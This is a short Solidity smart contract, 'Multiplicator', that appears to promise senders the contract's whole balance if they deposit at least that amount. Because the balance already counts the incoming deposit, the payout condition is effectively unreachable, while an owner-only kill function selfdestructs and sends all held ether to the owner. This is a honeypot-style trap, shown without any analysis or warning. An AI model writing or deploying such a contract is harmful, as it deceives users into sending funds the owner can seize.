 

contract Multiplicator
{
         
        
        address public Owner = msg.sender;
        mapping (address => bool) winner;  
        


        function multiplicate(address adr) public payable
        {
            
            if(msg.value>=this.balance)
            {
                require(winner[msg.sender] == false); 
                winner[msg.sender] = true; 
                adr.transfer(this.balance+msg.value);
            }
        }
        
        function kill() {
            require(msg.sender==Owner);
            selfdestruct(msg.sender);
         }
         
     
    function () payable {}

}